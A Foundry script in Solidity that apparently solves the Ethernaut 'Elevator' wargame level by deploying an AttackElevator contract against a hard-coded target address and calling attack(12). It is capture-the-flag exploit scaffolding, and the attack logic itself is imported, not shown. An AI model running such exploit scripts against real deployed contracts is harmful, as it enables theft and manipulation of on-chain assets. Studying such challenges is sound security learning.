//SPDX-License-Identifier: MIT

pragma solidity ^0.8.25;

import {Script, console} from "forge-std/Script.sol";
import {Elevator} from "../src/Elevator.sol";
import {AttackElevator} from "../src/AttackElevator.sol";

contract AttackElevatorScript is Script {
    address targetInstance = 0xB91fb42e6805281A79d8f42e2bda9E7226e0eC13;
    Elevator public elevator;
    AttackElevator public attacker;

    function run() public {
        elevator = Elevator(targetInstance);

        vm.startBroadcast();
        attacker = new AttackElevator(address(elevator));
        attacker.attack(12);
        vm.stopBroadcast();
        console.log("The Top floor is reached.", elevator.top());
    }
}
